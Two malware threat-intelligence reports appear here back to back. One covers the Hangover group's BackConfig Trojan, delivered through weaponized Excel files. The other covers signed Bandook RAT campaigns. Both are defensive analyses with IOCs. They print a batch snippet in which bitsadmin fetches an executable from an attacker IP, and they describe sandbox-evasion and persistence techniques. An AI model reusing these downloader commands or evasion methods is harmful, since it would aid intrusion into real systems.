At the time of writing, the C2 appeared inoperational and no further payloads were seen. We believe that the resultant wuaupdt.exe file would then provide further capabilities to steal information, log keystrokes, and provide the ability to run additional commands either directly or via additional plugins which it would download, as documented by the Qihoo 360 Threat Intelligence group in their investigation of prior campaigns here. Unit 42 has conducted cursory binary diffing for many of the BackConfig executable files and did not find any non-library function overlaps that would suggest that the payloads are based on the YTY or EHDev frameworks as mentioned here and here.

PE Metadata
The malware sample contains some interesting static artifacts including self-signed digital certificates used to sign the executable purporting to be software from the Foxit Software Incorporated company based in California. It is not known why the actors picked this company -- and others listed in Table 1 below -- to impersonate but, as previously mentioned, their use of filenames and URLs makes their payloads appear benign and trustworthy. Using this meta-data, together with information gleaned from infrastructure investigation, Unit 42 were able to pivot around on AutoFocus data to find additional BackConfig PE executable samples. Those samples from the last 12 months are listed in Tables 1 and 2 below. SHA256	Compilation Time (UTC)	First Seen (Pacific)	Signer Name
84e5629... 01/20/2020 7:26:09am	01/19/2020 11:49:03pm	Foxit Software Incorporated
18ce3ee... 10/10/2019 9:22:11am	01/16/2020 4:30:26pm
4a4bc01... 11/21/2019 9:19:49am	01/16/2020 1:31:46am	wind0ws
91c67c1... 11/21/2019 9:19:49am	12/02/2019 2:03:41am
de5b670... 11/21/2019 9:19:49am	11/21/2019 11:59:05pm
f79ebf0...

10/28/2019 5:35:26am	11/09/2019 10:32:09pm	NVIDIA Corporation
31faeef... 10/10/2019 9:22:11am	10/13/2019 10:11:04pm	Foxit Software Incorporated
d87b875... 09/12/2019 5:54:04am	09/26/2019 9:32:19am	Digicert Global
1510996... 12/05/2018 4:35:03am	04/09/2019 10:30:16am	Foxit Software Incorporated
Table 1. Describing PE compile times and Digital signatures used, ordered by first seen. The Compilation Time stored in executable (SHA256: 84e5629...) appears to be after the point at which the file was first seen by our WildFire analysis system. While the PE file timestamp could be modified post-compilation, the oddity is more likely explained away with time zones -- 2349 Pacific time on the 19th is 1349 in Bangladesh on the 20th, and 7:26am UTC is in the range of 11:26 to 13:26 across the South Asia region, which would make the sample compilation quite recent with respect to the delivery of it. More details about the self-signed digital certificates, as well as full hashes, can be found in the IOCs section at the end of this report.

The following table shows the version information from the same PE files, grouped by similar File Description fields. The order remains the same, except for the sample (SHA256: 18ce3ee...) which was first seen January 16th, 2020 but for some reason reverted to using exact version information seen in samples two to three months prior. Namely, Link Finder. SHA256	File Description	File Version	Product Name	Product Version	Copyright
84e5629... Альберт (Albert, in English)	06.10.2015	Альберт	01.05.2015	Copyright @ 2015-2026 secosec
4a4bc01... Ссылка
(Link, in English)

01.01.12	ссылка	10.01.2015	Copyright @ 2011-2021 secosec Inc. Все права защищеныk (All rights reserved, in English)
91c67c1... de5b670... 18ce3ee... Link Finder	01.01.12	Link Finder	13,9,1632	Copyright @2011-2020 Techtest Inc. All Rights Reserved
f79ebf0... 31faeef... d87b875... scrapper	01.12.001	scrapper	13,6,1662	Copyright @Scrapper Ltd Reserved
1510996... system process	2,1,1,2015	system process cleaner	2,1,1,2015	Copyright © 2004-2018 Foxit Software Inc. All Rights Reserved
Table 2. Describing PE version info metadata, ordered by first seen and grouped on matching data.

Of the set, the file (SHA256: 1510996...) has most consistency in terms of a theme, using the Foxit Copyright information, self-signed digital signature and even using the company logo, as shown in the Figure below, for the executable file’s icon. The file’s copyright information only differs from that of Foxit’s Reader software by a missing period symbol, implying it was copied rather than created. The actors then moved to use seemingly fictitious company and product names while using a mixture of signer names in their digital signatures. No file icons were used at all over the last 11 months. Recent samples also included Cyrillic text in the file description, product name, and copyright fields, as shown and translated in the table above. It’s hard to know if this is an attempt to set false flags as to the origins of the BackConfig malware, or perhaps to make the content more relevant to specific targets within the victim organizations.

Delivery and Installation
In this section, we describe how the various payloads are delivered based on what we have seen in our customer networks, as well as what we have established through open-source research. Unit 42 has yet to see any evidence of weaponized documents used to deliver BackConfig being attached on phishing emails and that phishing URL links in emails appear to be the Hangover group’s modus operandi. The remainder of this section focuses largely on Object Linking and Embedding (OLE) Microsoft Excel documents, as they are most commonly used by the Hangover group, at least when it comes to the BackConfig malware. Through infrastructure analysis however, Unit 42 was able to find a BackConfig PE sample (SHA256: e28f1bc0b0910757b25b2146ad02798ee6b206a5fe66ce68a28f4ab1538d6a1f; first seen 10/24/2019) using the C2 domain matissues[.]com and dropped by the weaponised Rich Text Format (RTF) file (SHA256: 752c173555edb49a2e1f18141859f22e39155f33f78ea70a3fbe9e2599af3d3f) from the same day. The RTF used the CVE-2017-11882 exploit against equation editor vulnerabilities in Office applications to execute the PE sample which was a unique exploitation method compared to all other samples analyzed.

Compromised Third-Party Infrastructure
Continuing to pivot on data obtained from the samples found thus far, we discovered some related URLs relating to compromised third-party infrastructure supporting the delivery of the BackConfig malware. The following table lists some examples of compromised sites delivering weaponised XLS files with filenames, such as Circular_No_03.xls (SHA256: 0aa5cf1025be21b18ab12d8f8d61a6fa499b3bbcdbdced27db82209b81821caf) and Circullar_Nov_2017.xls (SHA256: ed638b5f33d8cee8f99d87aa51858a0a064ca2e6d59c6acfdf28d4014d145acb) implying (even with incorrect spelling) that the contents is, or relates to, a letter or advertisement which is distributed to a large number of people. SHA-256	First Seen	Related URL	Description	Location
be3f12b... 2019-10	http://nsaimmigration[.]com/userfiles/image/
fbr.php and nphp_registration_form.php (both HTTP 404)

Consultant and Legal Advice company supporting students to live and study abroad. Pakistan
0aa5cf1... 2018-09	http://webtechhub[.]com/wordpress/wp-content/images/fbr_circular.php	Web design and dev site running outdated WordPress application	Pakistan
ed638b5... 2017-11	http://alphamike.com[.]mv/housing	Shipping agency for freight forwarding and cargo delivery. Maldives
http://mgamphs.edu[.]bd/info/ (down)	Muhurigonj Academy of Music and Performance High School. Reference. Bangladesh
Table 3. Compromised third-party infrastructure to support delivery of BackConfig.

Given the targeting related to these threats, and the compromised third-party websites, we believe the use of “fbr” in some of the URLs above likely relates to the Federal Board of Revenue (FBR) government organization of Pakistan. The “fbr” theme also runs into the VBA macro code. File ed638b5... contains the statement Const WelcomePage = "FBR". The old compromised hosting examples in Table 3 above do not rely on Hypertext Preprocessor (PHP) server-side scripts to deliver the weaponized XLS files. Instead, the pages simply used HTTP response status 301 (Moved Permanently) for URL redirection to said XLS, initiating the download. More recent examples make use of PHP with URL filenames matching the social engineering theme, such as “fbr”. In addition, the actors use the PHP script to log any visitors to the page noting in a file named “info.txt” the datetime stamp of the event, the client operating system, and their IP address.

The location of the compromised third-party infrastructure or the organizations legitimately using them, align with the targeting Unit 42 has seen. This could be pure coincidence, a sign from the threat actors that their intention is to take advantage of weaknesses in the target country’s wider infrastructure, or the threat actors leveraging in-country infrastructure that may be considered more trustworthy by the intended victims and their security solutions. Palo Alto Networks’ WildFire sandbox analyzed sample ed638b5... on November 8th, 2017, and, as described in the table above, the sample was hosted on two compromised websites: a Bangladesh school and a Maldivan shipping agency. While Unit 42 has not seen Hangover activity in the Maldives, the archipelago is in the region alongside other known targets and interestingly, swore in a new President about a week after Unit 42 analyzed the sample. The EXE payload (SHA256: 4104a871e03f312446ef2fb041077167a9c6679f48d48825cbc1584e4fa792cd) downloaded directly by the VBA code in sample ed638b5...

from the URL below relates to those documented by BitDefender here. To date, Unit 42 has only seen 6 similar samples since the late-2017 timeframe for this sample, compared to many more prior, perhaps indicating a change over of the custom payloads used by the Hangover group. Certainly, there are some overlaping Tactics Techniques and Procedures (TTPs) between the older samples and the more recent BackConfig samples. http://chancetowin.quezknal[.]net/appstore/updatepatch/logs.exe

Evolution of Delivery Payloads
Before moving on to describe the most recent samples and installation methods used by the Hangover actors, the timeline figure below provides a high-level view of the evolution in TTPs used. Figure 2. Evolution of delivery payloads
Despite the evolution over the years, some habits are hard to break. Firstly, every weaponized XLS Unit 42 has investigated loads a fake error message, such as the one shown in Figure 3 below, to trick the victim into thinking that the file is corrupt and thus nothing has -- or will -- load as intended.

Another fictitious error message text has been used in the past often with poor spelling or grammar. Figure 3. Example fake error message displayed to the victim. Similarly, the version information metadata stored in all the Excel documents analyzed share the same Author and Last Modified By names - Testing. The following subsections describe the campaigns and malware as highlighted by the three most recent milestones in the timeline figure above. 2019 Milestone: Multi-Component
Registration Form.xls (SHA256: be3f12bcc467808c8cc30a784765df1b3abe3e7a426fda594edbc7191bbda461) listed in Table 3 above provides an example of the types of lures used by the threat actors. Upon opening the XLS and enabling the macro code, the picture in Figure 4 below is shown on top white-background cells. As the filename suggests, it’s a registration form and relates to the Naya Pakistan Housing program run by the Pakistani government to help solve the housing shortfall in the country. Eligible citizens include government employees and registration forms were due by October 15th, 2019 (extended through November 15th), meaning the timing and the lure of the campaign on October 25th were clearly planned to increase the chances of compromise.

Figure 4. Social engineering lure against Pakistan government in October 2019
As the PHP webpages did not exist at the time of writing, Unit 42 cannot prove the XLS file be3f12b... was hosted at the URL listed in row 1 of Table 3 above. However, because of the following points, we have high confidence in the campaign relationship between the two. AutoFocus and VirusTotal first processed the XLS file be3f12b... on October 25th, 2019
VirusTotal processed the nsaimmigration... URL on the same day
A specific HTTP GET request URL using the notation nphp_registration_form.php?r= was processed in VirusTotal on the same day, and has relations to http://185.203.119[.]184/fin_div/session, which matches the IP address and URL structure in the VBS code dropped by the XLS be3f12b.... The name of the PHP webpage nphp_registration_form.php relates to the filename of the XLS. The VBA macro code in the XLS file be3f12b... differed somewhat from that of the samples of the previous years.

Instead of directly storing encoded EXE files or running batch shell commands directly from the VBA code itself, it retrieved the content from hidden columns in the Excel sheet, starting at column 27 or “AA”, which is likely to be off-screen for most people. Once the font colour was changed, the “setup” batch code component as per previous variants, and the new Visual Basic Script (VBS) downloader component were revealed in columns AA and AB, respectively, as shown in figure 5 below. Figure 5. VBS downloader and BAT setup file revealed in the XLS sheet. Macro VBA code in the XLS parses the content of the two columns line by line writing the contents to their respective files on disk and executing them following the same process flow as described below in Figure 6. 2019 Milestone: BITS and ZIPs
A more recent weaponized XLS file (SHA256: 021b030981a6db1ec90ccbd6d20ee66b554b7d8c611476e63426a9288d5ce68b) was analyzed by WildFire on November 15th, 2019 and exposed some new techniques.

On this occasion, the VBA macro code contained a decimal-encoded ZIP file of only 1,062 bytes in size. Inside the ZIP archive were two text files that would be decompressed to a folder driverkit. One file, driverkit.bat, is the “setup” BAT file already discussed in this report and listed in the appendix section. The other file, Winmgt.txt, is an adaptation of the VBS downloaded also described in this report. However, instead of a direct HTTP download using an MSXML DOM object, this version writes the following contents to Winmgt_Drive.bat, which is executed by a third scheduled task created by the “setup” BAT file. echo off
bitsadmin /transfer Microsoft_Update /download /priority high 
http://185.203.119[.]184/winmgt/winmgt.exe 
%USERPROFILE%\Adobe\Driver\pdf\winmgt.exe
del %0
1
2
3
4
5
6
echo off
bitsadmin /transfer Microsoft_Update /download /priority high 
http://185.203.119[.]184/winmgt/winmgt.exe 
%USERPROFILE%\Adobe\Driver\pdf\winmgt.exe
 
del %0
2020 Milestone: Fine Tuning
The following execution flow diagram is based on one of the most recent weaponized documents Unit 42 has seen Invoice.xls (SHA256: 8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83c; first seen 2020-01-15).

The infection process consists of multiple components as just described. The “setup” batch (BAT) file coordinates much of the infection process of the BackConfig plug-in loader once the VBA has written it to disk and executed it. Figure 6. Execution flow of BackConfig malware
The numbered bullet list below describes Figure 6. Text file Drive.txt (SHA-256: 4f75622c2dd839fb5db7e37fb0528e38c4eb107690f51f00b5331e863dc645d1) is created and contains the decimal-decoded VBS content. Similarly, the VBA code then writes batch code to another text file - Audio.txt. The content of both files is shown in the appendix section of this report. Audio.txt is renamed to Audio.bat and executed. Audio.bat cleans up any files and folders related to previous infections, and recreates the required environment including creating the aforementioned pid.txt file, and setting various folders and files to be hidden from a default Windows Explorer view. The contents of pid.txt is the victim’s computer name concatenated with a hyphen followed by a random number, although I believe the code used would not work as intended.

Audio.bat continues by creating two scheduled tasks referencing two files that are yet to exist: dphc.exe will run every 10 minutes and Drive.vbs at 20 minute intervals. Finally, before deleting itself, Audio.bat will rename Drive.txt to Drive.vbs. When Drive.vbs is eventually executed by the task scheduler, it will download the BackConfig executable payload. In the case of file 8892279f3... the remote location is http://185.203.119[.]184/Dropbox/request. When dphc.exe is eventually executed by the task scheduler, it first checks for the presence of pid.txt (step 4.) and only continues if the file exists. Ultimately, the XLS writes two files to disk, one of which -- the BAT -- immediately modifies some system settings and creates two scheduled tasks. However, this behaviour may not be enough to determine the components as malicious. Only after 20 minutes will the task scheduler execute the VBS downloader component and launch the BackConfig loader EXE, by which time analysis systems may have stopped monitoring.

ATT&CK
The following table describes the TTPs associated with the multiple campaigns described in this report. Tactic	Technique (Mitre ATT&CK ID)
Technical Information Gathering	Acquire OSINT data sets and information (T1247)
Conduct social engineering (T1249)
Adversary Opsec	Compromise 3rd party infrastructure to support delivery (T1312)
Build Capabilities	Create custom payloads (T1345)
Obtain/re-use payloads (T1346)
Stage Capabilities	Upload, install, and configure software/tools (T1362)
Initial Compromise	Spear Phishing Link (T1192)
Execution	User Execution (T1204)
Exploitation for Client Execution (T1203)
Execution, Persistence	Scheduled Task (T1053)
Defense Evasion	Code Signing (T1116)
Deobfuscate/Decode Files or Information (T1140)
Hidden Files and Directories (T1158)
Obfuscated Files or Information (T1027)
Defense Evasion, Execution	Scripting (T1064)
Defense Evasion, Persistence	BITS Jobs (T1197)
Command & Control	Commonly Used Port (T1043)
Standard Application Layer Protocol (T1071)
Standard Cryptographic Protocol (T1032)
Remote File Copy (T1105)
Conclusion
The Hangover group (aka Neon, Viceroy Tiger, MONSOON) is active and targeting, according to Unit 42’s visibility, government and military organisations in South Asia using spear-phishing emails containing letters or government forms to lure victims into browsing to compromised websites serving weaponized Excel documents that install the BackConfig Trojan.

Almost exclusively, Unit 42 has seen the use of weaponized documents that require user execution. Only once in the last six months have we seen use of exploits to circumvent the need for the user to execute any part of the installation chain. The evolution of BackConfig’s primary and secondary payloads has seen different methods used for executing commands and deploying executables both with and without obfuscation. The latest versions contain modular components making it easier to update and re-use code in order to rapidly deploy their campaigns in a timely manner to have the highest chance of success. The method in which the latest samples execute also indicates the group’s focus on trying to evade sandbox and other automated analysis systems by breaking down malicious activity into chunks that each seem relatively benign. Protections:

	Cortex XDR protects endpoints from all malware, exploits and fileless attacks associated with Hangover actors.

WildFire® cloud-based threat analysis service accurately identifies samples associated with these malware families. Threat Prevention provides protection against the known client and server-side vulnerability exploits, malware, and command and control infrastructure used by these actors. URL Filtering identifies all phishing and malware domains associated with these actors and proactively flags new infrastructure associated with these actors before it is weaponized. Users of AutoFocus™ contextual threat intelligence service can view malware associated with these attacks using the following tags:
More information about the Hangover group and the BackConfig malware can be found in AutoFocus. Palo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visit www.cyberthreatalliance.org. (This is added to blogs pre-shared with the CTA, when loaded into WordPress it will be added when appropriate).

Indicators of Compromise
Delivery Documents
56349cf3188a36429c207d425dd92d8d57553b1f43648914b44965de2bd63dd6
8892279f3d87bcd44d8f9ac1af7e6da0cfc7cf1731b531056e24e98510bea83c
021b030981a6db1ec90ccbd6d20ee66b554b7d8c611476e63426a9288d5ce68b
be3f12bcc467808c8cc30a784765df1b3abe3e7a426fda594edbc7191bbda461
0aa5cf1025be21b18ab12d8f8d61a6fa499b3bbcdbdced27db82209b81821caf
ed638b5f33d8cee8f99d87aa51858a0a064ca2e6d59c6acfdf28d4014d145acb
752c173555edb49a2e1f18141859f22e39155f33f78ea70a3fbe9e2599af3d3f (RTF using CVE-2017-11882)

Batch Files
4BAFBF6000A003EB03F31023945A101813654D26B7F3E402D1F51B7608B93BCB (Audio.txt / .bat from Naya Housing campaign)
C94f7733fc9bdbcb503efd000e5aef66d494291ae40fc516bb040b0d1d8b46c9
6a35d4158a5cb8e764777ba05c3d7d8a93a3865b24550bfb2eb8756c11b57be3
750fc47d8aa8c9ae7955291b9736e8292f02aaaa4f8118015e6927f78297f580
5292f4b4f38d41942016cf4b154b1ec65bb33dbc193a7e222270d4eea3578295
f64dbcd8b75efe7f4fa0c2881f0d62982773f33dcfd77cccb4afc64021af2d9e
98d27e830099c82b9807f19dcef1a25d7fce2c79a048d169a710b272e3f62f6e
29c5dd19b577162fe76a623d9a6dc558cfbd6cddca64ed53e870fe4b66b44096 (driverkit.bat)
abe82ffb8a8576dca8560799a082013a7830404bb235cb29482bc5038145b003 (Winmgt_Drive.bat uses bitsadmin)
02c306bb120148791418136dcea8eb93f8e97fb51b6657fd9468c73fb5ea786c

VBS files
87e8c46d065ace580b1ed28565d1fddaa6df49da1ba83f7b3e9982cd8a0013f1 (One_drivers.txt / .vbs from Naya Housing campaign)
952d4a9891a75e25e1c31a0514b97345ca0d8f240cdd4a57c8b3ff8a651a231a (Down_LinkLog.vbs)
a1cd89a684db41206fc71efe327ef608652931e749c24a3232908824cea426bb (Winmgt.vbs using BITS)

EXE Payloads
306fe259a250b2f0d939322cfb97787c4076c357fc9eb1f1cc10b0060f27f644
0f11fb955df07afc1912312f276c7fa3794ab85cd9f03b197c8bdbefb215fe92
84e56294b260b9024917c390be21121e927f414965a7a9db7ed7603e29b0d69c
18ce3eebbb093a218a8f566b579a5784caee94fadcda8f8c0d21f214ce2bd8b9
922d6e68ecac6dbfdd1985c2fae43e2fc88627df810897e3068d126169977709
4a4bc01b20dd2aaa2a2434dc677a44cc85d9533bed30bc58b8026b877db028d5
677d4982d714bb47fab613ebe1921005509ed0d1e8965e7241994e38c3ade9f2
d3013204f1a151c72879afc213dca3cada8c3ea617156b37771bdd7b7b74057f
91c67c1cda67b60c82e14a5c32d79a4236f5a82136317162dfbde1a6054cf8c1
de5b670656cbdbcf11607f01a6f93644765d9647ddab39b54946170b33f7ac9a
f79ebf038c7731ea3a19628cb329cada4ebb18f17439d9c6cf19d361b0494e7b
9e141fe67521b75412419a8c88c199c8ebd2a135c7a8b58edced454fbc33cb77
6787242a810f8a5e1423e83790064a0a98954ab0802a90649fdd55a47d75695e
e28f1bc0b0910757b25b2146ad02798ee6b206a5fe66ce68a28f4ab1538d6a1f
07c97b253452a2a8eb7753ed8c333efeaa3546c005ffcfb5b3d71dc61c49abda
31faeefb4dc4e54b747387bb54a5213118970ccb2f141559f8e2b4dbfdbeb848
15109962da4899949863447bfdf6a6de87a8876f92adb7577392032df44ec892
D87b875b8641c538f90fe68cad4e9bdc89237dba137e934f80996e8731059861
167c7d7c08d318bc40e552e6e32715a869d2d62ba0305752b9b9bece6b9e337e
4104a871e03f312446ef2fb041077167a9c6679f48d48825cbc1584e4fa792cd (example of older set of downloaders)
b18697e999ed5859bfbc03e1d6e900752e1cdcd85ddb71729e2b38161366e5b5 (driverkit.zip)

Infrastructure
linkrequest[.]live (23.106.123[.]87)
matissues[.]com
unique.fontsupdate[.]com
185.203.119[.]184
212.114.52[.]148

Digital Signatures
The following list of self-signed digital certificates is not exhaustive, and only relates to those seen on BackConfig PE executables samples over the past twelve months. Foxit:
thumbprint: 79635cb32cf16cf6bddfd563b09d7aa99ccb2c01
issuer: CN=Foxit Software Incorporated
subject: CN=Foxit Software Incorporated
version: 3
algorithm: sha1WithRSAEncryption
serial: 50:53:ce:ad:42:c2:70:84:4f:55:bc:76:a4:23:6c:c8
valid from: 1/1/2018
valid to: 1/1/2024

Wind0ws:
thumbprint: aa9010ff841c67cf8fb88d7f1e86a778b35bcba0
issuer: CN=wind0ws
subject: CN=wind0ws
version: 3
algorithm: sha1WithRSAEncryption
serial: 88:de:2e:60:7f:48:2c:81:44:54:32:29:98:22:69:70
valid from: 1/1/2019
valid to: 1/1/2025

NVIDIA:
thumbprint: 01ba433fdc7f9b1ad1baaea6c5fd69243d03d8c3
issuer: CN=NVIDIA Corporation
subject: CN=NVIDIA Corporation
version: 3
algorithm: sha1WithRSAEncryption
serial: 6d:39:d4:59:15:9e:8c:b3:41:da:bd:4c:dd:37:60:e1
valid from: 1/1/2019
valid to: 1/1/2025

BANDOOK: SIGNED & DELIVERED
 November 26, 2020

Introduction
Check Point Research recently observed a new wave of campaigns against various targets worldwide that utilizes a strain of a 13-year old backdoor Trojan named Bandook. Bandook, which had almost disappeared from the threat landscape, was featured in 2015 and 2017 campaigns, dubbed “Operation Manul” and “Dark Caracal“, respectively.
These campaigns were presumed to be carried out by the Kazakh and the Lebanese governments, as uncovered by the Electronic Frontier Foundation (EFF) and Lookout. During this past year, dozens of digitally signed variants of this once commodity malware started to reappear in the threat landscape, reigniting interest in this old malware family.
In the latest wave of attacks, we once again identified an unusually large variety of targeted sectors and locations. This further reinforces a previous hypothesis that the malware is not developed in-house and used by a single entity, but is part of an offensive infrastructure sold by a third party to governments and threat actors worldwide, to facilitate offensive cyber operations.
In this publication, we showcase the latest evolution of the infection chain offered by this unknown third-party, compare the different Bandook variants, and share the various techniques its creators use to hinder analysis and detection of all the components in the attack flow. Infection Chain
As the infection chain is constantly evolving, we describe the one used by the attackers from as early as July, to the present day.
The full infection chain of the attack can be broken down into three main stages. The first stage starts, as in many other infection chains, with a malicious Microsoft Word document delivered inside a ZIP file.
Once the document is opened, malicious macros are downloaded using the external template feature. The macros’ code in turn drops and executes the second stage of the attack, a PowerShell script encrypted inside the original Word document.
Finally, the PowerShell script downloads and executes the last stage of the infection: the Bandook backdoor. The names of the various artifacts described below may vary from one infection to the next.
First Stage – Lure Documents
The first stage starts with a Microsoft Word document with embedded encrypted malicious script data and an external template that points to a document containing malicious VBA macros. The external template is downloaded via a URL shortening web service like TinyURL or Bitly, which redirects to another domain controlled by the attacker.
The external template document contains a VBA code that runs automatically, decrypts the embedded data from the original lure document, and drops the decoded data into two files in the local user folder: fmx.ps1 (the next stage PowerShell) and sdmc.jpg (base64 encoded PowerShell code). To allow this behavior, the attackers use a combination of two techniques: encrypted data is embedded inside a shape object within the original document (hidden from view by a small font size and white foreground), and is accessed from the external template code by using the following code:

o4QQLW7zXjLbj = ActiveDocument.Shapes(1).TextFrame.TextRange.Text

For proper analysis, both the original document and the external template must be located, which makes things a bit more difficult for investigators.
We observed and analyzed multiple pairs of documents and external templates. Different lure images were used, alongside different encryption keys.
The external templates are not visible to the victim. Their only purpose is to provide malicious macros.
Interestingly, with each attack, after a certain amount of time, the attacker switched the malicious external template to a benign one, further muddying our analysis of the infection chain. Here again, the external templates look like random benign documents:

The themes of the documents are often of cloud-based services like Office365, OneDrive and Azure that contain images of other documents supposedly available once the victim clicks “Enable Content.”

For example, one of the documents that specifically got our attention depicts an Office365 logo and a preview of a certificate issued by the government of Dubai.
JAFZA – Jebel Ali Free Zone, featured at the top of the document, is an industrial area surrounding the port of Jebel Ali in Dubai, where more than 7,000 global companies are based. Sample document file names:

Malaysia Shipment.docx
Jakarta Shipment.docx
malta containers.docx
Certified documents.docx
Notarized Documents.docx
bank statement.docx
passport and documents.docx
Case Draft.docx
documents scan.docx

Second Stage – PowerShell Loader
After the VBA code drops the two files (fmx.ps1 and sdmc.jpg), it invokes fmx.ps1.
fmx.ps1 is a short PowerShell script that decodes and executes a base64 encoded PowerShell stored in the second dropped file (sdmc.jpg). First, the decoded PowerShell script downloads a zip file containing four files from a cloud service such as Dropbox, Bitbucket or an S3 bucket.
The zip file is stored in the user’s Public folder, and the four files are locally extracted. Three of the files, a.png, b.png and untitled.png, are used by the PowerShell script to generate the malware payload in the same folder.
untitled.png, unlike the other two files, is in a valid image format. It contains a hidden RC4 function encoded in the RGB values of the pixels, created using a known tool named invoke-PSImage.
The final executable payload is concatenated from the following files:

a.png – After it is decrypted using RC4 and stored as aps.png. b.png – As is.
Finally, the PowerShell script executes the malware, opens draft.docx, and deletes all previous artifacts from the Public folder. draft.docx is a benign document whose sole purpose is to convince the victim that the document is no longer available, and that the overall execution was successful.
Third Stage – The Bandook Loader
The final payload in this infection chain is a variant of an old full-featured RAT named Bandook. Written in both Delphi and C++, Bandook has a long history, starting in 2007 as a commercially available RAT that was developed by a Lebanese individual nicknamed PrinceAli.
Over time, several variants of the malware builder were leaked to the Web, and the malware became publicly available for download. Bandook’s execution flow starts with a loader, written in Delphi, that uses the Process Hollowing technique to create a new instance of an Internet Explorer process and inject a malicious payload into it.
The payload contacts the C&C sever, sends basic information about the infected machine, and waits for additional commands from the server. The variant of the Bandook malware we observed in this attack was not one of the variants whose builder was previously leaked to the Web (which supported a range of more than 100 commands).
In this attack, the threat actor utilized a custom, slimmed-down version of the malware with only 11 supported commands, including:

File operations
Taking screenshots
File download
File upload
File execution
For a full list of commands and their corresponding request codes, see Appendix A. In this version, the communication protocol with the C&C server was also upgraded  to use AES encryption.
Bandook variants in the wild
After comparing the Bandook variant we observed in the attack with the ones created by different leaked builders, we began hunting for variants more similar to the ones we observed. Our search led us to tweets by the MalwareHunterTeam (MHT) from 2019-2020 that mention various Bandook samples — all of them digitally signed with certificates that were issued by Certum.
In the newer attack flows we observed, we once again found valid Certum certificates were used to sign the Bandook malware executable. Analyzing all Bandook samples noted by MHT, we discovered that the very first of the samples was compiled in March 2019 and supported around 120 commands.
A sample compiled a few days later – a different signed Bandook variant (with only 11 commands) utilized the very same C&C server. Since then, all signed samples use only 11 basic commands.
The shared C&C provides clear evidence that both the slimmed-down and the fully-fledged variants of the malware are operated by a single attacker. In addition to the Bandook samples that were reported by MHT, we identified additional samples from the same time period (2019-2020) which were not digitally signed and contained about 120 commands.
These were the only ITW Bandook samples we were able to locate from this time period. Several factors led us to believe that these signed and unsigned variants are specially crafted Bandook variants, used and developed by the same entity.
Both use the same domain registration services for their C&C domains: Porkbun or NameSilo. They share a similar method of communication, using the AES encryption algorithm in CFB mode, with a hardcoded IV: 0123456789123456.
This feature is not available in the public leaks of this malware. They incorporated commands that we did not observe in any other public leak or report.
Most notable are the commands to execute Python and Java payloads. At this point, we have three different variants of the malware, which we believe are operated and sold by a single entity, in accordance with their chronological appearance:

A full-fledged version with 120 commands (not signed).
A full-fledged version (single sample) with 120 commands (signed). A slimmed-down version with 11 commands (signed).
The move to a slimmed-down version with only 11 commands for signed executables may indicate the operators’ desire to reduce the malware’s footprint and maximize their chances for an undetectable campaign against high profile targets (and high paying customers), while continuing the use of the un-signed 120 commands variant for lower profile ones. Furthermore, such a minimized backdoor might indicate that the slimmed-down variant of Bandook is only utilized as a loader for an additional, more full-featured malware to be downloaded next.
Targeting
As mentioned previously, in this campaign we observed an unusually large variety of targeted sectors and locations. This strengthens a hypothesis made by researchers – that the malware is not being developed and used by a single entity, but an offensive infrastructure is being sold by a third-party, to governments and threat actors worldwide, to facilitate offensive cyber operations.
The different targeted sectors include:

Government, financial, energy, food industry, healthcare, education, IT and legal institutions. In the following countries:

Singapore, Cyprus, Chile, Italy, USA, Turkey, Switzerland, Indonesia and Germany.
Connection to Dark Caracal
This campaign isn’t the first instance of the Bandook malware incorporated in a targeted attack. As mentioned, in a joint report from Lookout and the EFF, targeted attacks utilizing a Bandook variant, called “Dark Caracal”, were attributed to the Lebanese General Security Directorate.
Some of this campaign’s characteristics and similarities to previous campaigns leads us to believe that the activity we describe in this report is indeed the continuation and evolution of the infrastructure used during the Dark Caracal operation:

The use of the same certificate provider (Certum) throughout the various campaigns. The use of the Bandook Trojan, in what appears to be a unique evolving fork from the same source code (which is not known to be publicly available).
Samples from the Dark Caracal campaign (2017) utilized around 100 commands, compared to the current 120 command version we analyzed. This wave of attacks shares the same anomalous characteristics for targeted attacks –  an extreme variance in the selected targets, both in their industry and their geographic spread.
Finally, EFF researchers who first disclosed the Dark Caracal operation also believe that the same attacker “is back at it” again. Conclusion
All evidence points to our belief that the mysterious operators behind the malicious infrastructure of “Operation Manul” and “Dark Caracal” are still alive and operational, willing to assist in the offensive cyber operations to anyone who is willing to pay.
Although not as capable, nor as practiced in operational security like some other offensive security companies, the group behind the infrastructure in these attacks seems to improve over time, adding several layers of security, valid certificates and other techniques, to hinder detection and analysis of its operations. Check Point SandBlast Agent protects against this APT attack, and prevents it from the very first steps.
Appendix A: Bandook Commands
Below is a list of commands that the slimmed-down version of Bandook supports. Command	Functionality
@0001	Download and Execute file via HTTP
@0002	Download and Execute file via raw TCP socket
@0003	Take a screenshot
@0004	List drives
@0005	List files
@0006	Upload file
@0007	Download file
@0008	Shell execute
@0009	Move File
@0010	Delete file
@0011	Get Public IP

Appendix B: Indicators of Compromise
C&Cs from MHT Samples
Domains
ntsclouds[.]com
jtoolbox[.]org
idcmht[.]com
htname[.]info
vdscloud[.]net
mainsrv[.]top
olex[.]live
branchesv[.]com
C&Cs from additional Samples
Domains
s1[.]megawoc[.]com
s2[.]megawoc[.]com
s3[.]megawoc[.]com
s1[.]fikofiko[.]top
s2[.]fikofiko[.]top
s3[.]fikofiko[.]top
d1[.]p2020[.]club
d2[.]p2020[.]club
pronews[.]icu
p2020[.]xyz
2ndprog[.]monster
ercuc[.]com
tancredis[.]com
ec2[.]mbcde[.]net
nopejohn[.]com
External Templates
Domains
horizongb[.]com
styleco[.]me
ewsdocs[.]com
raysdoor[.]com
vsimperial[.]com
mxtms[.]com
Maldocs
MD5	SHA-1	SHA-256
27f8d8bbbeeda5fc439ee18d9d4da343	e78721fd283b0093fb0556167e1b38b81ed0c7bb	1ad83e9d06428dd87203ab8fcc6142014a9c05f3eb9afd61347834f39082d72a
44584c8d010242fddb44afe5ce860872	500813f95615b25f622e82e6c79431d7f4928bc4	74feaf3aa116a88ef3b10453e77feadefbe4e53dd7a71dd3b8309cc9d76cdec9
a6501c62b3a6ffa8d028a88138fe509f	118633bbe46520c65529c0cd1d6eb52f810f6327	034d8ec8d510033c387bb87cac35d240b7b8daa3b5167732118c755c5e6c1d48
